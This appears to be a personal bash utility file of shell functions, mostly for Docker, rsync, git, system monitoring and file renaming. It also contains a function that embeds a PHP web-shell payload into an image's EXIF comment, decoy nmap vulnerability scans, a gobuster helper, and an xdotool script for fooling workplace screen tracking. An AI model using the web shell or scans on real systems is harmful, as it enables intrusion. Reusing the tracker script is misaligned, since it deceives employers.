#!/usr/bin/env bash
# shellcheck shell=bash
# sourced utility functions

# import .env
import() {
    set -a
    source "${1:?"usage: import <env-file>"}"
    set +a
}

docker-clean-all () {
    docker container prune -f
    docker image prune -f
    docker volume prune -f
}

docker-in() {
    docker exec -it "${1:?"usage: docker-in <container>"}" /bin/bash
}

docker-arch(){
    local img_name
    img_name=${1:-"my-image"}
    docker image inspect "$img_name" --format '{{.Architecture}}'
}

clean-rust () {
    local days
    days=${1:-7}

    find . -type d -mtime +"$days" -name target -exec rm -rf {} + \
    -o -type f -name Cargo.lock -exec rm -f {} +
}

# check LAN cable for all network interfaces
check-lan() {
    for interface in /sys/class/net/*; do
        echo "$interface: carrier $(cat "$interface/carrier"), operstate $(cat "$interface/operstate")"
    done
}

agent(){
    if [ -z "${1:-}" ]; then
        opencode
    else
        # nono run --profile agent -- opencode "$session"
        opencode -s "$1"
    fi
}

# # execute command forever with timeout
# run-forever() {
#     local cmd timeout
#     cmd="$1"
#     timeout="${2:-1}"
#
#     while true; do
#         bash -c "$cmd"
#         sleep "$timeout"
#     done
# }
#
# # iterate through all subdirs and execute a command
# execr() {
#     local dir cmd
#     cmd="$1"
#
#     for dir in */; do
#         (
#             cd "$dir" || exit
#             bash -c "$cmd"
#         )
#     done
# }

# Show local/public IP adresses with or without interface argument using a shell
local-ip(){
    local iface=${1:-}
    echo -e "local:"
    ip addr show "$iface" | awk '/inet /{print $2}' | cut -d/ -f1
    echo
    echo "public:"
    curl -s https://api.myip.com
}

# gobuster password authentication examples
gobust() {
    gobuster -e -u "${1:?"usage: gobust <url>"}" -w wordlist
}

rsync_() {
    local COMMON_EXCLUDES output total transferred
    COMMON_EXCLUDES=(
    "--exclude" "*Camera*"
    "--exclude" "*target*"
    "--exclude" "*logs*"
    "--exclude" "*venv*"
    "--exclude" "*mypy_cache*"
    "--exclude" "*node_modules*"
    "--exclude" "*-build*"
    "--exclude" "*gdc*"
    "--exclude" "*bb*"
    "--exclude" "*godot*"
    "--exclude" "*pi-linux*"
    "--exclude" "*lvx"
    "--exclude" "*log/*"
)
    output=$(sudo rsync -avzh --delete --checksum --stats "$@" "${COMMON_EXCLUDES[@]}" | tee /dev/stderr)

    total=$(awk -F': ' '/^Number of files:/ {gsub(/[^0-9]/, "", $2); print $2}' <<< "$output")
    transferred=$(awk -F': ' '/^Number of regular files transferred:/ {gsub(/[^0-9]/, "", $2); print $2}' <<< "$output")

    RSYNC_TOTAL_FILES=$((RSYNC_TOTAL_FILES + ${total:-0}))
    RSYNC_TRANSFERRED_FILES=$((RSYNC_TRANSFERRED_FILES + ${transferred:-0}))
}

# SCP_RETRY_DELAY=5 scp_retry file.txt user@host:/path/.
scp_retry() {
    local delay="${SCP_RETRY_DELAY:-2}"
    until scp "$@"; do
        echo "$(date --rfc-3339 seconds): scp failed, retrying in ${delay}s..." >&2
        sleep "$delay"
    done
}

# NMAP
# This command will perform a stealth SYN scan (-sS) using a decoy list of 10 random IP addresses (-D RND:10)
# and using your IP address as a source IP address (ME).
# It will not ping the target (-Pn) and will run a script to check for vulnerabilities
# (--script vuln) and save the output to a file called scan_result.txt (-oN scan_result.txt).
nmap-stealth-syn() {
    nmap -sS -D RND:10,ME -Pn --script vuln -oN scan_result.txt "${1:?"usage: nmap-stealth-syn <target>"}"
}

# Aggressive scan to determine host OS
nmap-aggressive() {
    nmap -Pn -A -T4 "${1:?"usage: nmap-aggressive <target>"}"/24
}


# add file to an image as a comment
# exiftool must be installed
embedd-to-image() {
    : "${1:?"usage: embedd-to-image <text> <image-file>"}" "${2:?"usage: embedd-to-image <text> <image-file>"}"
    exiftool "-comment<=$1" "$2"
}

# embed php toy webbackdoor
embedd-bd() {
    : "${1:?"usage: embedd-bd <image-file>"}"
    echo "<?php system(\$_GET['cmd']);?>" > bd
    exiftool "-comment<=bd" "$1"
    rm bd
}

biggest-dirs(){
    local search_path th
    search_path=${1:-$(pwd)}  # default current directory
    th=${2:-"100M"} # default 100M threshold

    echo "Analysing disk usage..."
    du -h --max-depth=5 "$search_path" --threshold="$th" | sort -hr | head -n 20
}

core-loads() {
    for i in 1 2; do
        awk '/^cpu[0-9]/{print $1, $5+$6, $2+$3+$4+$5+$6+$7+$8}' /proc/stat > /tmp/cpu$i
        [ $i -eq 1 ] && sleep 1
    done
    paste /tmp/cpu1 /tmp/cpu2 | awk '{tot=$6-$3; idle=$5-$2; printf "%s: %.0f%%\n", $1, 100*(tot-idle)/tot}'
}

temps() {
    local out

    echo "CPU:"
    if command -v sensors &> /dev/null; then
        # coretemp (intel) + k10temp (amd)
        out=$(sensors 2>/dev/null | grep -E "Package id 0|Tctl|Tccd|Tdie|Core [0-9]+:")
    fi
    if [ -n "$out" ]; then
        echo "$out"
    else
        # fallback: raw kernel thermal zones, no lm-sensors needed
        for z in /sys/class/thermal/thermal_zone*; do
            [ -f "$z/temp" ] || continue
            awk -v t="$(cat "$z/type" 2>/dev/null)" '{printf "%s: %.1f°C\n", t, $1/1000}' "$z/temp"
        done
    fi

    echo "GPU:"
    out=""
    if command -v nvidia-smi &> /dev/null; then
        out+=$(nvidia-smi --query-gpu=name,temperature.gpu --format=csv,noheader,nounits 2>/dev/null | awk -F', ' '{print "nvidia "$1": "$2"°C"}')
    fi
    if command -v rocm-smi &> /dev/null; then
        [ -n "$out" ] && out+=$'\n'
        out+=$(rocm-smi --showtemp 2>/dev/null | grep -iE "edge|junction|mem")
    fi
    if command -v sensors &> /dev/null; then
        local amd_sensors
        amd_sensors=$(sensors 2>/dev/null | grep -iE "^amdgpu|edge|junction|mem")
        if [ -n "$amd_sensors" ]; then
            [ -n "$out" ] && out+=$'\n'
            out+="$amd_sensors"
        fi
    fi
    if command -v intel_gpu_top &> /dev/null; then
        [ -n "$out" ] && out+=$'\n'
        out+=$(timeout 1 intel_gpu_top -J 2>/dev/null | grep -i -A1 '"temperature"' | grep -i value)
    fi

    if [ -n "$out" ]; then
        echo "$out"
    else
        echo "no GPU sensor tool found (install nvidia-smi, rocm-smi, or lm-sensors)"
    fi
}

# create install USB from ISO
# burn-usb-iso /dev/sdb /path/to/my.iso
burn-usb-iso() {
    local disk iso
    disk=$1
    iso=$2

    if [[ $# -ne 2 ]]; then
        echo "Usage: burn-usb-iso <device> <iso>" >&2
        return 1
    fi

    if [[ ! -f "$iso" ]]; then
        echo "ISO not found: $iso" >&2
        return 1
    fi

    if [[ ! -b "$disk" ]]; then
        echo "Not a block device: $disk" >&2
        return 1
    fi

    echo "WARNING: This will wipe $disk"
    read -r "?Type YES to continue: " confirm
    [[ "$confirm" == "YES" ]] || return 1

    (
        set -x
        sudo dd if="$iso" of="$disk" bs=4M status=progress conv=fsync
    )
}

# show logs without weird sequences
# sudo apt install colorized-logs
logless(){
    : "${1:?"usage: logless <logfile>"}"
    ansi2txt < $1 | less
}

strip-logs() {
    local in out
    in=${1:-"input.log"}
    out=${2:-"output.log"}

    # Strips all escape sequences and control codes from stdin.
    cat -p "$in" | sed -e 's,[\x00-\x08\x0E-\x1F]\|\x1B\(\[[0-?]*[ -/]*[@-~]\),,g' > "$out"
}


rot13() {
    cat -p | tr "$(echo -n {A..Z} {a..z} | tr -d ' ')" "$(echo -n {N..Z} {A..M} {n..z} {a..m} | tr -d ' ')"
}

sup() {
    local pids
    if [ -z "$1" ]; then
        echo "Check the memory and CPU the process currently holds.\nUsage: sup <process_name>"
        return 1
    fi

    pids=$(pgrep -f "$1" | paste -sd, -)

    if [ -z "$pids" ]; then
        echo "No matching processes found for '$1'"
        return 1
    fi

    ps -p "$pids" -o pid=,rss=,pcpu= | awk '
    {mem+=$2; cpu+=$3}
    END {
    printf "Memory: %.2f MB\n", mem/1024
    printf "CPU: %.2f%%\n", cpu
    }'
}

# wargames <user>
wargames() {
    ssh -o PubkeyAuthentication=no -o PreferredAuthentications=password  -p 2220 "${1:?"usage: wargames <user>"}"@bandit.labs.overthewire.org
}

vim-conflict() {
    nvim $(git ls-files -u | cut -f2 | sort -u)
}

git-sign-all-commits() {
    # to make it better - add key to an ssh-agent
    git rebase --exec 'git commit --amend --no-edit -S' -i --root
}
git-sign-n() {
    local n

    n=${1:-1}
    git rebase --exec 'git commit --amend --no-edit -S' HEAD~"$n"
}
git-reset-author() {
    git rebase -r --root --exec 'git commit --amend --no-edit --reset-author'
}
git-rename() {
    OLD=${1:- };
    NEW=${2:- };
    echo old: $OLD new: $NEW;

    git ls-files -z | xargs -0 sed -i -e "s/$OLD/$NEW/g"
}

git-rm-files-from-history() {
    local git_path="$1"

    if [[ -z "$git_path" ]]; then
        echo "You must specify a path to remove from git history."
        echo
        echo "Usage:"
        echo "  git-rm-files-from-history path/to/file"
        echo
        echo "Largest blobs in history (for reference):"
        git rev-list --objects --all \
        | git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize) %(rest)' \
        | awk '$1=="blob" {print $3 "\t" $4}' \
        | sort -rn | head
        return 1
    fi

    echo "⚠️  WARNING:"
    echo "This will rewrite git history and affect all branches and tags."
    echo "You should back up your repository first."
    echo
    read -r -p "Continue? (y/N) " choice

    case "$choice" in
        y|Y)
            echo "Removing '$git_path' from git history..."
            git filter-branch --force \
            --index-filter "git rm --cached --ignore-unmatch '$git_path'" \
            --prune-empty \
            --tag-name-filter cat \
            -- --all
            echo
            echo "✅ Done."
            echo "Next steps:"
            echo "  git push --force --all"
            echo "  git push --force --tags"
            ;;
        *)
            echo "Operation canceled."
            return 1
            ;;
    esac
}

zj-reset() {
    mv ~/.cache/zellij/permissions.kdl .
    rm -rf ~/.cache/zellij/*
    mv permissions.kdl ~/.cache/zellij/permissions.kdl
}


restart-plasma(){
    killall plasmashell
    plasmashell &
}

# normalize the name into kebab-case
# replace all spaces with -
# replace weird youtube ticks by normal ones
# clean up repeating dashes
#
# # example
# normalize <file> [prefix]
#
# ```bash
# normalize "Artes undead - --pilates.mp3"
# artes-undead-pilates.mp3
#
# ```
normalize() {
    local normalize_name prefix temp
    normalize_name=${1:?"usage: normalize <name> [prefix]"}
    prefix=${2:-""}
    temp="$prefix$(echo "$normalize_name" | tr '[:upper:]' '[:lower:]' | \
        sed 's/ \[[^]]*\]//g' | \
        sed 's/[＂"]\|[＂"]//g' | \
        sed 's/\.-\| \./-/g' | \
        sed 's/\\//g' | \
        sed 's/ /-/g' | \
        sed 's/,/-/g' | \
        sed 's/-–-/-/g' | \
        sed 's/--/-/g' | \
        sed 's/&/and/g' | \
        sed 's/,-/-/g')"

    echo "$temp"
}

# prefix all, lowercase and remove anything that matches " \[[*]]*\]"
# which is a usual yt-dlp residual
# usage:
# prefix-all <the-group> [PATTERN]
prefix-all(){
    local prefix patt new

    prefix=${1:-""}
    patt=${2:-"*"}
    echo "prefix $prefix"

    find . -name "$patt" -type f -print0 -exec bash -c '
    normalize() {
    local normalize_name prefix temp

    prefix=${2:-""}
    normalize_name=$(basename "$1")
    temp="$prefix$(echo "$normalize_name" | tr "[:upper:]" "[:lower:]" | \
    sed "s/ \[[^]]*\]//g" | \
    sed "s/[＂\"]\|[＂\"]//g" | \
    sed "s/\.-\| \./-/g" | \
    sed "s/ /-/g" | \
    sed "s/---/-/g; s/--/-/g" | \
    sed "s/-–-/-/g" | \
    sed "s/--/-/g" | \
    sed "s/_/-/g" | \
    sed "s/,-/-/g")"

    echo "$temp"

    }

    new=$(normalize "$0" "$1")
    mv -v "$0" "$new"' {} "$prefix" \;

    # will create a lot of empty directories
    find . -type d -print0 -empty -delete
}

# dumb screen tracker exploit for soulless corporate jobs I used to use as as a junior
explore() {
    local rnds c WIDS id
    rnds=${1:-100}
    echo "rnds $rnds"

    for ((c=1; c<=rnds; c++)); do
        sleep 5
        WIDS=$(xdotool search --onlyvisible "gnome-terminal")
        xdotool search "Mozilla" windowactivate --sync
        sleep 540
        xdotool search "Visual Studio Code" windowactivate --sync

        for id in $WIDS; do
            sleep 540
            xdotool windowactivate "$id"
        done
        echo "done $c"
    done
    echo "done end"
}

work_test() {
    local rnds c WIDS id
    rnds=${1:-3}
    echo "rnds $rnds"

    for ((c=1; c<=rnds; c++)); do
        sleep 5
        WIDS=$(xdotool search --onlyvisible "gnome-terminal")
        xdotool search "Mozilla" windowactivate --sync
        sleep 1
        xdotool search "Visual Studio Code" windowactivate --sync

        for id in $WIDS; do
            sleep 1
            xdotool windowactivate "$id"
        done
        echo "done $c"
    done
    echo "done end"
}

# watch a process for memory/thread leaks: monoom <name|pid> [interval_s]
monoom() {
    local target interval pid
    target=${1:?"usage: monoom <name|pid> [interval_s]"}
    interval=${2:-5}

    if [[ "$target" =~ ^[0-9]+$ ]]; then
        pid=$target
    else
        pid=$(pidof -s "$target") || { echo "no process '$target'"; return 1; }
    fi

    while sudo test -d "/proc/$pid"; do
        echo "$(date +%T) rss_mb=$(( $(sudo awk '/VmRSS/{print $2}' "/proc/$pid/status") / 1024 ))" \
            "threads=$(sudo ls "/proc/$pid/task" | wc -l)" \
            "maps=$(sudo cat "/proc/$pid/maps" | wc -l)"
        sleep "$interval"
    done
    echo "$(date +%T) pid $pid exited"
}

utils-help() {
    declare -F | awk '{print $3}' | sort
}

